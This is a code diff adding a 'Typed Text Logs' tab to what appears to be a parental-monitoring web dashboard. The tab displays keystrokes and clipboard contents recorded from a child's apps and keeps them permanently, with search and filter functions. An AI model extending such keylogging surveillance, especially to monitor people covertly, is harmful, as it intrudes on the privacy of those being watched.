@@ -678,6 +678,12 @@
                 </button>
             </li>
             <li class="nav-item">
+                <button class="nav-link" data-bs-toggle="pill" data-bs-target="#tab-keystrokes" id="tab-keystrokes-btn">
+                    <i class="fa-solid fa-keyboard me-1"></i> Typed Text Logs (টাইপ করা লেখা)
+                    <span class="badge bg-primary rounded-pill ms-1" id="keystrokesBadge">{{ recent_keystrokes|length }}</span>
+                </button>
+            </li>
+            <li class="nav-item">
                 <button class="nav-link" data-bs-toggle="pill" data-bs-target="#tab-rules">
                     <i class="fa-solid fa-sliders me-1"></i> Rules & Limits
                 </button>
@@ -1198,6 +1204,104 @@
                 </div>
             </div>
 
+            <!-- TAB: TYPED TEXT & KEYSTROKES -->
+            <div class="tab-pane fade" id="tab-keystrokes">
+                <div class="card-custom p-4 mb-4">
+                    <div class="d-flex flex-wrap justify-content-between align-items-center gap-3 mb-4">
+                        <div class="d-flex align-items-center gap-3">
+                            <div class="p-3 rounded-3" style="background: rgba(13, 110, 253, 0.1); color: #0d6efd;">
+                                <i class="fa-solid fa-keyboard fs-4"></i>
+                            </div>
+                            <div>
+                                <h4 class="fw-bold mb-1 text-dark">Typed Text & Keystroke History (টাইপ করা লেখা ও ক্লিপবোর্ড রেকর্ড)</h4>
+                                <p class="text-secondary small mb-0">Never lose typed text or searches. Any content written in notepad, chat, browser, or copied to clipboard is permanently recorded here — even if the window is closed.</p>
+                            </div>
+                        </div>
+                        <div class="d-flex align-items-center gap-2">
+                            <button onclick="fetchKeystrokes()" class="btn btn-outline-primary rounded-pill px-3 py-2 fw-bold small">
+                                <i class="fa-solid fa-arrows-rotate me-1" id="keyRefreshSpinner"></i> Refresh Logs
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Search and Filter Bar -->
+                    <div class="row g-2 align-items-center mb-4">
+                        <div class="col-md-6">
+                            <div class="input-group">
+                                <span class="input-group-text bg-light border-slate-200 text-secondary"><i class="fa-solid fa-magnifying-glass"></i></span>
+                                <input type="text" id="keystrokeSearchInput" onkeyup="filterKeystrokes()" class="form-control form-control-dark" placeholder="Search keywords (e.g. game name, search query, text)...">
+                            </div>
+                        </div>
+                        <div class="col-md-6 d-flex justify-content-md-end gap-2">
+                            <button class="btn btn-sm btn-dark rounded-pill px-3" id="keyFilterAll" onclick="setKeyFilter('all')">All Records</button>
+                            <button class="btn btn-sm btn-light border border-slate-200 rounded-pill px-3" id="keyFilterType" onclick="setKeyFilter('keystroke')"><i class="fa-solid fa-keyboard me-1 text-primary"></i> Typed Only</button>
+                            <button class="btn btn-sm btn-light border border-slate-200 rounded-pill px-3" id="keyFilterClip" onclick="setKeyFilter('clipboard')"><i class="fa-solid fa-paste me-1 text-success"></i> Clipboard Copy</button>
+                        </div>
+                    </div>
+
+                    <!-- Keystroke Logs Feed -->
+                    <div id="keystrokeListContainer">
+                        {% if recent_keystrokes %}
+                        <div class="table-responsive">
+                            <table class="table table-dark-custom align-middle mb-0">
+                                <thead>
+                                    <tr>
+                                        <th style="width: 140px;">Time</th>
+                                        <th style="width: 160px;">Application</th>
+                                        <th style="width: 220px;">Window / Search Title</th>
+                                        <th style="width: 110px;">Type</th>
+                                        <th>Recorded Text Content</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="keystrokeTableBody">
+                                    {% for item in recent_keystrokes %}
+                                    <tr class="keystroke-row" data-type="{{ item.log_type }}" data-content="{{ item.content|lower|e }}" data-app="{{ item.process_name|lower|e }}" data-title="{{ item.window_title|lower|e }}">
+                                        <td>
+                                            <div class="fw-bold text-dark small">{{ item.time_str }}</div>
+                                            <div class="text-secondary" style="font-size: 0.72rem;">{{ item.date_str }}</div>
+                                        </td>
+                                        <td>
+                                            <span class="badge bg-light text-dark border border-slate-200 fw-bold small text-truncate" style="max-width: 150px;" title="{{ item.process_name }}">
+                                                {{ item.process_name }}
+                                            </span>
+                                        </td>
+                                        <td>
+                                            <div class="small text-secondary text-truncate" style="max-width: 210px;" title="{{ item.window_title }}">
+                                                {{ item.window_title or 'Desktop / Unknown' }}
+                                            </div>
+                                        </td>
+                                        <td>
+                                            {% if item.log_type == 'clipboard' %}
+                                            <span class="badge bg-success bg-opacity-10 text-success border border-success border-opacity-25 rounded-pill px-2 py-1 small">
+                                                <i class="fa-solid fa-paste me-1"></i> Copied
+                                            </span>
+                                            {% else %}
+                                            <span class="badge bg-primary bg-opacity-10 text-primary border border-primary border-opacity-25 rounded-pill px-2 py-1 small">
+                                                <i class="fa-solid fa-keyboard me-1"></i> Typed
+                                            </span>
+                                            {% endif %}
+                                        </td>
+                                        <td>
+                                            <div class="p-2 rounded-3 bg-light border border-slate-200 text-dark font-monospace small" style="white-space: pre-wrap; word-break: break-word; max-height: 120px; overflow-y: auto;">
+                                                {{ item.content }}
+                                            </div>
+                                        </td>
+                                    </tr>
+                                    {% endfor %}
+                                </tbody>
+                            </table>
+                        </div>
+                        {% else %}
+                        <div class="text-center py-5 bg-light rounded-4 border border-slate-200" id="emptyKeystrokeBox">
+                            <i class="fa-solid fa-keyboard fs-1 text-secondary mb-3 opacity-50"></i>
+                            <h5 class="fw-bold text-dark">No Keystroke or Text Records Yet</h5>
+                            <p class="text-secondary small mb-0">Whenever the child types sentences in any app (Notepad, browser search, chat, etc.) or copies text to the clipboard, the complete text will automatically be preserved here.</p>
+                        </div>
+                        {% endif %}
+                    </div>
+                </div>
+            </div>
+
         </div>
 
     </div>
@@ -1599,6 +1703,125 @@
 
             const modal = new bootstrap.Modal(document.getElementById('screenshotLightboxModal'));
             modal.show();
+        }
+
+        // --- Keystroke and Text Operations ---
+        let currentKeyFilter = 'all';
+
+        function setKeyFilter(type) {
+            currentKeyFilter = type;
+            const allBtn = document.getElementById('keyFilterAll');
+            const typeBtn = document.getElementById('keyFilterType');
+            const clipBtn = document.getElementById('keyFilterClip');
+            if (allBtn) allBtn.className = (type === 'all' ? 'btn btn-sm btn-dark rounded-pill px-3 active' : 'btn btn-sm btn-light border border-slate-200 rounded-pill px-3');
+            if (typeBtn) typeBtn.className = (type === 'keystroke' ? 'btn btn-sm btn-primary rounded-pill px-3 text-white active' : 'btn btn-sm btn-light border border-slate-200 rounded-pill px-3');
+            if (clipBtn) clipBtn.className = (type === 'clipboard' ? 'btn btn-sm btn-success rounded-pill px-3 text-white active' : 'btn btn-sm btn-light border border-slate-200 rounded-pill px-3');
+            filterKeystrokes();
+        }
+
+        function filterKeystrokes() {
+            const query = (document.getElementById('keystrokeSearchInput').value || '').toLowerCase().trim();
+            const rows = document.querySelectorAll('.keystroke-row');
+            let visibleCount = 0;
+
+            rows.forEach(row => {
+                const type = row.getAttribute('data-type') || '';
+                const content = row.getAttribute('data-content') || '';
+                const app = row.getAttribute('data-app') || '';
+                const title = row.getAttribute('data-title') || '';
+
+                const matchesFilter = (currentKeyFilter === 'all') || (type === currentKeyFilter);
+                const matchesQuery = (!query) || content.includes(query) || app.includes(query) || title.includes(query);
+
+                if (matchesFilter && matchesQuery) {
+                    row.style.display = '';
+                    visibleCount++;
+                } else {
+                    row.style.display = 'none';
+                }
+            });
+
+            const badge = document.getElementById('keystrokesBadge');
+            if (badge) badge.innerText = visibleCount;
+        }
+
+        async function fetchKeystrokes() {
+            const spinner = document.getElementById('keyRefreshSpinner');
+            if (spinner) spinner.classList.add('fa-spin');
+
+            try {
+                const q = document.getElementById('keystrokeSearchInput').value.trim();
+                let url = '/api/keystrokes?limit=50';
+                if (q) url += '&q=' + encodeURIComponent(q);
+                if (currentKeyFilter !== 'all') url += '&log_type=' + encodeURIComponent(currentKeyFilter);
+
+                const res = await fetch(url);
+                if (!res.ok) return;
+                const data = await res.json();
+                renderKeystrokeTable(data.keystrokes || []);
+            } catch (e) {
+                console.log('Error fetching keystrokes:', e);
+            } finally {
+                setTimeout(() => {
+                    if (spinner) spinner.classList.remove('fa-spin');
+                }, 500);
+            }
+        }
+
+        function renderKeystrokeTable(logs) {
+            const tbody = document.getElementById('keystrokeTableBody');
+            const container = document.getElementById('keystrokeListContainer');
+            if (!tbody || !container) return;
+
+            if (!logs || logs.length === 0) {
+                container.innerHTML = `
+                    <div class="text-center py-5 bg-light rounded-4 border border-slate-200">
+                        <i class="fa-solid fa-keyboard fs-1 text-secondary mb-3 opacity-50"></i>
+                        <h5 class="fw-bold text-dark">No Matching Keystroke Records</h5>
+                        <p class="text-secondary small mb-0">No typed sentences or clipboard copies matched your search criteria.</p>
+                    </div>`;
+                return;
+            }
+
+            let html = logs.map(k => `
+                <tr class="keystroke-row" data-type="${escapeHtml(k.log_type)}" data-content="${escapeHtml((k.content || '').toLowerCase())}" data-app="${escapeHtml((k.process_name || '').toLowerCase())}" data-title="${escapeHtml((k.window_title || '').toLowerCase())}">
+                    <td>
+                        <div class="fw-bold text-dark small">${k.time_str}</div>
+                        <div class="text-secondary" style="font-size: 0.72rem;">${k.date_str}</div>
+                    </td>
+                    <td>
+                        <span class="badge bg-light text-dark border border-slate-200 fw-bold small text-truncate" style="max-width: 150px;" title="${escapeHtml(k.process_name)}">
+                            ${escapeHtml(k.process_name)}
+                        </span>
+                    </td>
+                    <td>
+                        <div class="small text-secondary text-truncate" style="max-width: 210px;" title="${escapeHtml(k.window_title)}">
+                            ${escapeHtml(k.window_title || 'Desktop / Unknown')}
+                        </div>
+                    </td>
+                    <td>
+                        ${k.log_type === 'clipboard' 
+                            ? '<span class="badge bg-success bg-opacity-10 text-success border border-success border-opacity-25 rounded-pill px-2 py-1 small"><i class="fa-solid fa-paste me-1"></i> Copied</span>'
+                            : '<span class="badge bg-primary bg-opacity-10 text-primary border border-primary border-opacity-25 rounded-pill px-2 py-1 small"><i class="fa-solid fa-keyboard me-1"></i> Typed</span>'
+                        }
+                    </td>
+                    <td>
+                        <div class="p-2 rounded-3 bg-light border border-slate-200 text-dark font-monospace small" style="white-space: pre-wrap; word-break: break-word; max-height: 120px; overflow-y: auto;">
+                            ${escapeHtml(k.content)}
+                        </div>
+                    </td>
+                </tr>
+            `).join('');
+
+            tbody.innerHTML = html;
+            const badge = document.getElementById('keystrokesBadge');
+            if (badge) badge.innerText = logs.length;
+        }
+
+        function escapeHtml(text) {
+            if (!text) return '';
+            const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#039;' };
+            return text.toString().replace(/[&<>"']/g, m => map[m]);
         }
     </script>
 
